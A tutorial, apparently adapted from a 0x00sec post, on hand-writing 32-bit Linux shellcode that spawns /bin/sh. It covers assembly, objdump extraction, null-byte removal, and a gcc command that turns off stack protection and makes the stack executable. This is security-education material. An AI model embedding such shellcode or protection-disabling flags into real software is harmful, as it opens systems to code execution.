# [Linux Shellcoding](https://0x00sec.org/t/linux-shellcoding-part-1-0/289)

## Simple Shellcode

Here we will be writing a simple assembly program that spawns a shell. To do
this we need to install [nasm](https://www.nasm.us/) to be able to compile the
assembly code we write. It can be installed using `sudo apt-get install nasm`.

### Writing assembly code

Now we are ready to write an assembly program. In this program we will be using
a syscall to spawn a bash shell.

To call the syscall we will be using an interrupt as it does not require the
stack. To do this we can use the assembly code `int 0x80`. In linux, the
interrupt `0x80` is used for system calls.

[![Interrupt handlers](img/interrupt_codes.png)](https://stackoverflow.com/a/28784822)

The interrupt can take arguments in the registers `eax`, `ebx`, `ecx`, `edx`,
`esi`, and `edi`. The first argument is `eax`, should contain the syscall
number. We can use this resource to identify which syscalls we can use:
http://syscalls.kernelgrok.com/.

To spawn a shell, we will be using the `execve` syscall. This syscall is used to
execute programs, so we can execute `/bin/sh` using the syscall to spawn a
shell.

| Function                                                     | eax  | ebx                                   | ecx                              |
| ------------------------------------------------------------ | :--: | ------------------------------------- | -------------------------------- |
| [exit](http://man7.org/linux/man-pages/man2/exit.2.html)     | `1`  | `int error_code` (exit code)          | -                                |
| [execve](http://man7.org/linux/man-pages/man2/execve.2.html) | `11` | `char *pathname` (path to executable) | `char *const argv[]` (arguments) |

Using this knowledge we can write the following assembly code.

```asm
section .data
  msg db '/bin/sh' ; db stands for define byte, msg will now be a string pointer.

section .text
  global _start   ; Needed for compiler, comparable to int main()

_start:
  mov eax, 11     ; eax = 11, think of it like this mov [destination], [source], 11 is execve
  mov ebx, msg    ; Load the string pointer into ebx
  mov ecx, 0      ; no arguments in exc
  int 0x80        ; syscall

  mov eax, 1      ; exit syscall
  mov ebx, 0      ; no errors
  int 0x80        ; syscall
```

This code is similar to the following C code.

```c
main()
{
    execve("/bin/sh", 0);  // spawn shell
    exit(0);               // exit program
}
```

### Running the code

To run this assembly code, we must first compile it. To do this we must first
generate the object file for the code using `nasm` and then compile the file
using `ld`. We will be generating an `.elf` file from `nasm` as we are targeting
Linux machines, and since the assembly code we wrote is for 32-bit machines, we
must specify `ld` to compile it in 32-bit mode using the flag `-m elf_i386`.

```console
$ nasm -f elf -o shell.o shell.asm
$ ld -m elf_i386 -o shell.out shell.o
```

After compiling, we can run the program using `./shell.out`.

![Shell](img/initial_shell_output.png)

We have now successfully gotten a shell.

### Get shellcode

Now we can try to convert program to shellcode. First lets analyze the output of
`objdump` for the compiled binary

```console
$ objdump -M intel -s -d shell.out
```

![Objdump](img/objdump_explanation.png)

This shows some sections. Let's take a look at what each section does:

-   `.text` contains the program's actual code (the shell code)
-   `.data` is where the string data is stored
-   `<_start>` is the main program

We can now convert this shellcode into escaped C format which can be executed.

```c
"\xb8\x0b\x00\x00\x00\x00\xbb\xa0\x90\x04\x08\xb9\x00\x00\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80"
```

As we can see, the `.data` section is not included in the shellcode. This is
because the string is allocated to a virtual address space which is determined
when the program is done. This means that if we use the shellcode as is, the
output string might be and empty or garbage value, and would cause the shellcode
to fail.

In addition to this, we face another issue: **null bytes**.

### What are null bytes?

In C, strings are terminated using `\x00`, or a null byte. If a null byte is
included in a string, it will ignore everything placed after it. We can test
this using the following code.

```c
#include <stdio.h>
int main()
{
    printf("Hello\x00World");
    return 0;
}
```

Compiling and running this program produces the following output.

```console
$ gcc -o test_null_bytes.out test_null_bytes.c
$ ./test_null_bytes.out
Hello
```

As we can see, we used the string `Hello\x00World` in the program but the output
only gives `Hello`. This will become an issue while executing shellcode as if
there is a null byte, the execution of the shellcode will stop.

![Null bytes in shellcode](img/null_bytes_in_shellcode.png)

To fix this issue, we have to avoid using statements that result in `\x00` in
our assembly code. This can be tricky as we need to use `0` in our code multiple
times.

## Fixing Issues

### Addressing null bytes

#### Generating 0 using XOR

To overcome the limitations, we can try using the `XOR` instruction. The
instruction can be used to generate 0's without explicit statement due to the
way the XOR operation works.

|  A  |  B  | A `OR` B | A `XOR` B |
| :-: | :-: | :------: | :-------: |
|  0  |  0  |    0     |     0     |
|  1  |  0  |    1     |     1     |
|  0  |  1  |    1     |     1     |
|  1  |  1  |    1     |     0     |

As we can see above, if a number is XOR'd with itself, the result is 0. This
means that we can call the `xor` instruction with the same register as the
parameters to set it to 0.

![Testing XOR](img/xor_test.png)

As we can see here if we `xor` `eax` with itself, we do not get 0's in the
resulting shell code. We can analyze this further using `gdb`.

![Testing XOR gdb](img/xor_gdb_1.png)

As we can see here, before the `xor` instruction is run, `eax` has a value of 15.

But after the `xor` instruction is run, the value of `eax` becomes 0.

![Testing XOR gdb 2](img/xor_gdb_2.png)

We can now use `eax` instead of 0 in our code. But we still face a problem as we
will need to assign values to `eax` to be able to run our syscall. To overcome
this issue let's take a look at how `eax` is structured in memory.

#### Using lower half of registers

32-bit data registers such as `EAX`, `EBX`, `ECX`, and `EDX` can be used in 3
ways:

1. They can be used as complete 32 bit registers
2. The lower halves of the 32-bit registers can be used as four 16-bit
   registers: `AX`, `BX`, `CX`, and `DX`
3. Lower half of these 16-bit registers can be used as eight 8-bit registers:
   `AH`, `AL`, `BH`, `CH`, `CL`, `DH`, and `DL`.

![Registers Breakdown](img/registers.png)

The `AX` is the primary accumulator, and is used for most arithmetic
instructions. Usually, values are stored in the `AX` or `AL` registers according
to the size of the operand.

We can take advantage of this property to set values to `EAX` by assigning them
to `AL`. Doing so will not result in null bytes in the shell code as seen below.

![Assigning to Al](img/assign_to_al.png)

### Addressing strings

As mentioned before, we cannot use the `.data` section in assembly code as the
memory location for it will be dynamically assigned when the program is run. So
instead of using a pointer, we can try directly pushing the string on to the
stack. This way we can use the stack pointer, `ESP`, as a string.

Since the stack follows the first-in-last-out principle, we must assign values
to it in reverse order. To push values directly to the stack, we can use the
`push` instruction. This instruction can only push 4 bytes at a time.

To do this we can first convert the string to [ASCII hex
codes](https://ascii.cl/). This gives us the following result:

|   /    |   b    |   i    |   n    |   /    |   s    |   h    | `\x00` |
| :----: | :----: | :----: | :----: | :----: | :----: | :----: | :----: |
| `0x2f` | `0x62` | `0x69` | `0x6e` | `0x2f` | `0x73` | `0x68` | `0x00` |

This still produces a null byte as the string needs to be terminated using
`\x00`. We can overcome this by using the value in `eax` for the string
terminator since it is still set to 0 after the `xor` operation. We can
rearrange the code later to allow adding values to `eax` for the function.

Now we can split the string up into 4 byte blocks. The string must be reversed
so we will get the following as a result.

|   h    |   s    |   /    |   /    |
| :----: | :----: | :----: | :----: |
| `0x68` | `0x73` | `0x2f` | `0x2f` |
| **n**  | **i**  | **b**  | **/**  |
| `0x6e` | `0x69` | `0x62` | `0x2f` |

We must also add an extra `/` to the first block to avoid a null byte. The
resulting string be `/bin//sh`, but the extra `/` will not affect our output as
it will be ignored during execution.

![Calling bash with extra slash](img/extra_slash_call.png)

The strings can pushed to the stack using the `push` instruction, with the hex
value as the argument (e.g: `0x68732f2f` for `hs//`). Now our new assembly code
will look something like this:

```asm
_start:
  xor eax, eax     ; set eax to 0
  push eax         ; push 0 `\x00` to stack![](img/test_str_1.png)
  push 0x68732f2f  ; push `hs//`
  push 0x6e69622f  ; push `nib/`
```

When we view the compiled code, we can see that there are no null bytes in the
shellcode.

![Testing push string](img/test_str_1.png)

This will let `esp` have the value `/bin//sh\x00`. Can can see this below in
`gdb` when we print out the value of `esp`.

![Value of esp](img/test_str_2.png)

### Completing the rest of the code

Now we can complete the rest of the code. We can first assign the string in
`esp` to `ebx`

```asm
  mov ebx, esp
```

Them we can assign `eax` to `ecx`, to
specify that there are no arguments for the syscall.

```asm
  mov ecx, eax
```

Next we can assign a `0xb` to `AL` to make sure that the `execve` function will
be called.

```asm
  mov al, 0xb
```

Finally, we can do the syscall:
```asm
  int 0x80
```

This gives the following code which should not contain any null bytes.
```asm
_start:
  xor eax, eax     ; set eax to 0
  push eax         ; push 0 `\x00` to stack![](img/test_str_1.png)
  push 0x68732f2f  ; push `hs//`
  push 0x6e69622f  ; push `nib/`
  mov ebx, esp     ; move the string to ebx
  mov ecx, eax     ; set ecx as 0
  mov al, 0xb      ; set eax as 0xb
  int 0x80         ; execute the syscall

```




## Running the Shellcode

**Compiling test.c**

`test.c` needs to be compiled to target 32bit machines with stack protection
turned off

```console
$ gcc test.c -o test.out -m32 -fno-stack-protector -z execstack -no-pie
```

---

https://0x00sec.org/t/linux-shellcoding-part-1-0/289
